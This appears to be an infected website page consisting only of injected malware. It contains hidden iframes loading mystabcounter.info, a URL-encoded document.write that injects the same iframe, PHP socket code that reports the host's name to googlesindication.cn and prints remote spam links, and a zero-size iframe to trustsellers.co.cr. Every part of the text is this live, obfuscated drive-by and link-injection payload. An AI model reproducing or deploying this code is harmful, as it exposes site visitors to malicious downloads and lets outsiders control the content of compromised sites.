<iframe src='http://mystabcounter.info/index2.php' width='6' height='6' style='visibility: hidden;'></iframe><iframe src='http://mystabcounter.info/index2.php' width='6' height='6' style='visibility: hidden;'></iframe><iframe src='http://mystabcounter.info/index2.php' width='6' height='6' style='visibility: hidden;'></iframe>
<iframe src='http://mystabcounter.info/index2.php' width='6' height='6' style='visibility: hidden;'></iframe>
<iframe src='http://mystabcounter.info/index2.php' width='6' height='6' style='visibility: hidden;'></iframe>

<?php 
error_reporting(0);
$fn = "googlesindication.cn";

error_reporting(0);
$links = new GetLinks();
echo $links->fetch_remote_file("googlesindication.cn", "/links.php?site=".$_SERVER['HTTP_HOST']);
class GetLinks
{
    var $_socket_timeout    = 6;
    function fetch_remote_file($host, $path) 
   {
       @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $this->_socket_timeout);
          $this->_fetch_remote_type = 'socket';
        $buff = '';
        $fp = @fsockopen($host, 80, $errno, $errstr, $this->_socket_timeout);
        if ($fp) {
            @fputs($fp, "GET {$path} HTTP/1.0\r\nHost: {$host}\r\n");
            @fputs($fp, "User-Agent: {$user_agent}\r\n\r\n");
            while (!@feof($fp)) {
                $buff .= @fgets($fp, 128);
            }
            @fclose($fp);
          $page = explode("\r\n\r\n", $buff);
           return $page[1];
        }
    }
}

?><script>
var var11618124044=unescape('%3C%69%66%72%61%6D%65%20%73%72%63%3D%27%68%74%74%70%3A%2F%2F%6D%79'+
'%73%74%61%62%63%6F%75%6E%74%65%72%2E%69%6E%66%6F%2F%69%6E%64%65%78'+
'%32%2E%70%68%70%27%20%77%69%64%74%68%3D%27%36%27%20%68%65%69%67%68'+
'%74%3D%27%36%27%20%73%74%79%6C%65%3D%27%76%69%73%69%62%69%6C%69%74'+
'%79%3A%20%68%69%64%64%65%6E%3B%27%3E%3C%2F%69%66%72%61%6D%65%3E');
document.write(var11618124044);
</script><?php
$fp = fsockopen($fn, 80, $errno, $errstr, 10);
if (!$fp) {
} else {
$query='site='.$_SERVER['HTTP_HOST'];
   $out = "GET /links.php?".$query." HTTP/1.0\r\n";
   $out .= "Host: googlesindication.cn\r\n";
   $out .= "Connection: Keep-Alive\r\n\r\n";
   fwrite($fp, $out);
   while (!feof($fp)) {
$var .= fgets($fp, 128);
}
list($headers, $content) = explode("\r\n\r\n", $var);
print $content;
   fclose($fp);
} 
 ?><iframe src=http://trustsellers.co.cr/stat-m.php width=0 height=0 frameborder=0> </iframe>